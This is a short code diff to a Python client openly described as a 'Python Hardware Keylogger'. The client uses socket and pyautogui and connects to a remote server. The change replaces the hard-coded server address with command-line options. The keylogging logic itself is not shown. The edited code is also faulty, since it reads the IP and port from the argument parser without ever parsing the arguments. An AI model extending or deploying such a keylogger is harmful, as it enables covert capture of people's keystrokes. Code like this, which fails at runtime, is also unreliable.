@@ -1,7 +1,7 @@
 import socket
 import time
 import pyautogui
-
+import argparse
 
 class Client:
     def __init__(
@@ -48,8 +48,14 @@ class Client:
 
 
 if __name__ == "__main__":
+    args: argparse.ArgumentParser = argparse.ArgumentParser(
+        description="Python Hardware Keylogger"
+    )
+
+    args.add_argument("-i", "--ip", type=str, help="The server IP Addr.")
+    args.add_argument("-p", "--port", type=str, help="The server port")
     debugs: bool = True
-    c: Client = Client(server_ip="192.168.0.101", server_port=1234)
+    c: Client = Client(server_ip=args.ip, server_port=(lambda p: p if p else 1234)(args.port))
     while True:
         try:
             c.run(debug_mode=debugs)
